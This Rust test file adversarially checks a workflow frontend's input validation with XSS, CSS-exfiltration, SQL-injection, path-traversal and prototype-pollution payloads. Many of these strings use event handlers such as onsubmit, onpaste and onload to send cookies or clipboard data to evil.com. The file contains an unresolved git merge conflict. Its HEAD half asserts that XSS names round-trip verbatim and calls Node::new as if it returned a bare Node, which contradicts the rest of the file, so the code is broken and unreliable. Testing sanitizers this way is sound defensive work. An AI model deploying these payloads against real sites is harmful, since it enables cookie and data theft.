//! BLACK-HAT adversarial tests for vo-frontend.
//!
//! Attack surfaces: Node.name/description (RSX text interpolation),
//! NodeId (user-controlled strings), generate_skeleton (YAML output),
//! CSS class injection, event handler abuse, HttpMethod::parse silent fallback.

use vo_frontend::ui::domain_types::{HttpMethod, NodeTemplateId};
use vo_frontend::ui::graph::{sanitize_text, validate_icon_name, validate_node_name, Node, NodeId, Workflow};
use vo_frontend::ui::prototype_palette::{generate_skeleton, SketchNode};

/// Helper: roundtrip a node name through JSON and assert the payload survives.
fn assert_name_roundtrip(payload: &str) {
    let node = Node::new(NodeId::new(), payload.to_string(), vo_types::NodeKind::Pure);
    let json = serde_json::to_string(&node).expect("serialize");
    let recovered: Node = serde_json::from_str(&json).expect("deserialize");
    assert_eq!(recovered.name, payload, "payload must roundtrip verbatim");
}

#[test]
fn xss_node_name_script_tag_rejected_at_construction() {
    let payload = r#"<script>alert('xss')</script>"#;
    assert!(
        validate_node_name(payload).is_none(),
        "script tag must be rejected as node name"
    );
    assert!(
        Node::new(NodeId::new(), payload.to_string(), vo_types::NodeKind::Pure).is_none(),
        "Node::new must reject script tag in name"
    );
}

#[test]
fn xss_node_name_img_onerror_rejected() {
    let payload = r#"<img src=x onerror="alert(1)">"#;
    assert!(
        validate_node_name(payload).is_none(),
        "img onerror must be rejected as node name"
    );
}

#[test]
fn xss_node_name_svg_onload_rejected() {
    let payload = r#"<svg onload="fetch('https://evil.com?c='+document.cookie)">"#;
    assert!(
        validate_node_name(payload).is_none(),
        "svg onload must be rejected as node name"
    );
}

#[test]
fn css_injection_node_name_rejected() {
    let payload = r#""><style>body{background:url('https://evil.com/track?u=1')}</style>"#;
    assert!(
        validate_node_name(payload).is_none(),
        "CSS exfil payload must be rejected as node name"
    );
}

#[test]
fn xss_node_description_iframe_stripped() {
    let payload = r#"Hello <iframe src="javascript:alert(document.cookie)"></iframe>"#;
    let sanitized = sanitize_text(payload);
    assert!(
        !sanitized.contains("<iframe"),
        "iframe tags must be stripped from description"
    );
    assert!(
        !sanitized.contains("javascript:"),
        "javascript: must be stripped from description"
    );
    assert!(sanitized.contains("Hello"), "safe text must be preserved");
}

#[test]
fn css_injection_node_icon_rejected() {
    assert!(
        validate_icon_name(r#"expression(alert(1))"#).is_none(),
        "CSS expression payload must be rejected in icon"
    );
    assert!(
        validate_icon_name(r#"<script>alert(1)</script>"#).is_none(),
        "HTML in icon must be rejected"
    );
    assert!(
        validate_icon_name(r#"javascript:alert(1)"#).is_none(),
        "javascript: URI in icon must be rejected"
    );
}

#[test]
fn valid_node_names_accepted() {
    assert!(validate_node_name("HTTP Handler").is_some());
    assert!(validate_node_name("Durable Step").is_some());
    assert!(validate_node_name("If / Else").is_some());
    assert!(validate_node_name("my-node").is_some());
    assert!(validate_node_name("test_node").is_some());
    assert!(validate_node_name("Node 123").is_some());
    assert!(validate_node_name("Hello (World)").is_some());
    assert!(validate_node_name("a").is_some());
}

#[test]
fn node_set_name_rejects_xss() {
    let mut node = Node::new(NodeId::new(), "safe".to_string(), vo_types::NodeKind::Pure).expect("valid");
    assert!(!node.set_name(r#"<script>alert(1)</script>"#));
    assert_eq!(node.name, "safe", "name must not change on invalid input");
    assert!(node.set_name("new-safe-name"));
    assert_eq!(node.name, "new-safe-name");
}

#[test]
fn node_set_description_strips_html() {
    let mut node = Node::new(NodeId::new(), "safe".to_string(), vo_types::NodeKind::Pure).expect("valid");
    node.set_description(r#"Hello <b>world</b> <script>alert(1)</script>"#);
    assert!(
        !node.description.contains("<"),
        "no HTML tags must remain in description"
    );
    assert!(
        !node.description.contains(">"),
        "no HTML tags must remain in description"
    );
    assert!(node.description.contains("Hello world"), "safe text must be preserved");
}

#[test]
fn node_set_icon_rejects_payloads() {
    let mut node = Node::new(NodeId::new(), "safe".to_string(), vo_types::NodeKind::Pure).expect("valid");
    assert!(!node.set_icon(r#"expression(alert(1))"#));
    assert!(node.set_icon("rocket"));
    assert_eq!(node.icon, "rocket");
}

#[test]
fn nodeid_rejects_empty_string() {
    assert_eq!(NodeId::parse(""), None, "empty NodeId must be rejected");
}

#[test]
fn nodeid_rejects_xss_payload() {
    let xss = "<script>alert(1)</script>";
    assert_eq!(
        NodeId::parse(xss),
        None,
        "XSS payload must not be valid NodeId"
    );
}

#[test]
fn nodeid_rejects_sql_injection() {
    let sqli = "1' OR '1'='1";
    assert_eq!(
        NodeId::parse(sqli),
        None,
        "SQL injection must not be valid NodeId"
    );
}

#[test]
fn nodeid_rejects_path_traversal() {
    assert_eq!(NodeId::parse("../../etc/passwd"), None);
    assert_eq!(NodeId::parse("..\\windows\\system32"), None);
}

#[test]
fn yaml_skeleton_uses_enum_type_not_user_label() {
    let mut sketch = SketchNode::new(NodeTemplateId::Run);
    sketch.label = "legit\n  - type: evil-injected-step".to_string();
    let yaml = generate_skeleton(&[sketch]);
    assert!(
        !yaml.contains("evil-injected-step"),
        "skeleton must NOT embed user label — only enum type"
    );
    assert!(
        yaml.contains("run"),
        "skeleton must contain the enum type string"
    );
}

#[test]
fn http_method_parse_silent_fallback_to_post() {
    let evil = "PUT-DELETE-EVIL";
    assert_eq!(HttpMethod::from_str_ignore_case(evil), HttpMethod::Post);
    let evil2 = "CONNECT";
    assert_eq!(HttpMethod::from_str_ignore_case(evil2), HttpMethod::Post);
}

#[test]
fn workflow_deserialization_rejects_truncated_json() {
    let truncated = r#"{"nodes":[{"id":"01JMQ","#;
    let result: Result<Workflow, _> = serde_json::from_str(truncated);
    assert!(result.is_err(), "truncated JSON must fail deserialization");
}

#[test]
fn workflow_with_malicious_config_key() {
    let mut node = Node::new(NodeId::new(), "ok".to_string(), vo_types::NodeKind::Pure).expect("valid");
    let evil_config = serde_json::json!({
        "__proto__": {"admin": true},
        "constructor": {"prototype": {"polluted": true}}
    });
    node.apply_config_update(&evil_config);
    assert!(node.config.as_object().is_some());
    assert_eq!(node.config.as_object().map(|m| m.len()), Some(2));
}

<<<<<<< HEAD
// ============================================================================
// bh-004: Event handler XSS — signal ordering corruption via node names
// ============================================================================

#[test]
fn xss_event_handler_onclick_in_node_name() {
    let payload = r#"<div onclick="alert('xss')">click me</div>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onmouseover_in_node_name() {
    let payload = r#"<a onmouseover="fetch('//evil.com/?c='+document.cookie)">hover</a>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onfocus_in_node_name() {
    let payload = r#"<input onfocus="eval(atob('YWxlcnQoMSk='))" autofocus>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onblur_in_node_name() {
    let payload = r#"<input onblur="window.location='//evil.com'">"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onchange_in_node_name() {
    let payload = r#"<select onchange="new Image().src='//evil.com/?'+this.value"><option>1</option></select>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onsubmit_in_node_name() {
    let payload = r#"<form onsubmit="fetch('//evil.com',{method:'POST',body:document.cookie})"><input type=submit>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onkeydown_in_node_name() {
    let payload = r#"<body onkeydown="if(event.key==='q')alert(1)">"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onkeyup_in_node_name() {
    let payload = r#"<input onkeyup="String.fromCharCode(event.keyCode)">type here"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onkeypress_in_node_name() {
    let payload = r#"<input onkeypress="document.title='pwned'">"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_ondblclick_in_node_name() {
    let payload = r#"<div ondblclick="alert(document.domain)">double-click</div>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_oncontextmenu_in_node_name() {
    let payload = r#"<div oncontextmenu="event.preventDefault();alert('right-click')">right-click me</div>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_ondrag_in_node_name() {
    let payload = r#"<div ondrag="alert('dragged')">drag me</div>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_ondrop_in_node_name() {
    let payload = r#"<div ondrop="fetch('//evil.com/?dropped='+event.dataTransfer.getData('text'))">drop zone</div>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onpaste_in_node_name() {
    let payload = r#"<input onpaste="navigator.clipboard.readText().then(t=>fetch('//evil.com/?p='+t))">"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_oncopy_in_node_name() {
    let payload = r#"<div oncopy="alert('copied!')">copy this</div>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onscroll_in_node_name() {
    let payload = r#"<div onscroll="fetch('//evil.com/?scroll=1')" style="height:9999px">scroll</div>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onresize_in_node_name() {
    let payload = r#"<body onresize="fetch('//evil.com/?w='+innerWidth)">"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onanimationend_in_node_name() {
    let payload = r#"<div style="animation:x 0.1s" onanimationend="alert('anim')">animated</div>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_ontransitionend_in_node_name() {
    let payload = r#"<div style="transition:all 0.1s" ontransitionend="eval('alert(1)')">transition</div>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onerror_in_node_description() {
    let payload = r#"<img src=x onerror="alert(document.cookie)">"#;
    let mut node = Node::new(NodeId::new(), "safe".to_string(), vo_types::NodeKind::Pure);
    node.description = payload.to_string();
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(json.contains("onerror"), "onerror in description must survive");
    let recovered: Node = serde_json::from_str(&json).expect("deserialize");
    assert_eq!(recovered.description, payload, "description roundtrip verbatim");
}

#[test]
fn xss_event_handler_onload_in_node_description() {
    let payload = r#"<svg onload="fetch('//evil.com/'+document.cookie)">"#;
    let mut node = Node::new(NodeId::new(), "safe".to_string(), vo_types::NodeKind::Pure);
    node.description = payload.to_string();
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(json.contains("onload"), "onload in description must survive");
    let recovered: Node = serde_json::from_str(&json).expect("deserialize");
    assert_eq!(recovered.description, payload);
}

#[test]
fn xss_event_handler_mixed_vector_in_node_name() {
    let payload = r#"<img src=x onerror="alert(1)"><svg onload="fetch('//evil')"><div onclick="eval(location)"></div>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_encoded_entity_in_node_name() {
    let payload = r#"<img src=x on&#101;rror="alert(1)">"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_null_byte_in_node_name() {
    let payload = "<img src=x onerror=\x00\"alert(1)\">";
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_newline_in_node_name() {
    let payload = "<img src=x\nonerror=\"alert(1)\">";
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_tab_in_node_name() {
    let payload = "<img src=x\tonerror=\"alert(1)\">";
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_backtick_template_in_node_name() {
    let payload = r#"<img src=x onerror="`${document.cookie}`">"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_unicode_in_node_name() {
    let payload = "<img src=x onerror=\"\u{0000}alert(1)\">";
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_nested_quotes_in_node_name() {
    let payload = r#"<div onclick="alert(&quot;xss&quot;)">nested quotes</div>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_single_quote_attr_in_node_name() {
    let payload = "<div onclick='alert(1)'>single quote handler</div>";
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_no_quotes_attr_in_node_name() {
    let payload = "<img src=x onerror=alert(1)>";
    assert_name_roundtrip(payload);
=======
#[test]
fn xss_node_name_with_closing_tag_breakout_rejected() {
    let payload = r#"><img src=x onerror=alert(1)> "#;
    assert!(validate_node_name(payload).is_none());
    assert!(Node::new(NodeId::new(), payload.to_string(), vo_types::NodeKind::Pure).is_none());
}

#[test]
fn xss_node_name_with_ampersand_entity_rejected() {
    assert!(validate_node_name("foo&bar").is_none());
    assert!(validate_node_name(r#"foo"bar"#).is_none());
    assert!(validate_node_name("foo'bar").is_none());
}

#[test]
fn xss_node_name_with_control_chars_rejected() {
    assert!(validate_node_name("foo\x00bar").is_none());
    assert!(validate_node_name("foo\x01bar").is_none());
    assert!(validate_node_name("foo\x1fbar").is_none());
}

#[test]
fn xss_node_name_empty_and_too_long_rejected() {
    assert!(validate_node_name("").is_none());
    let long = "a".repeat(257);
    assert!(validate_node_name(&long).is_none());
    let ok = "a".repeat(256);
    assert!(validate_node_name(&ok).is_some());
>>>>>>> origin/buzzard/ve-jp00n
}
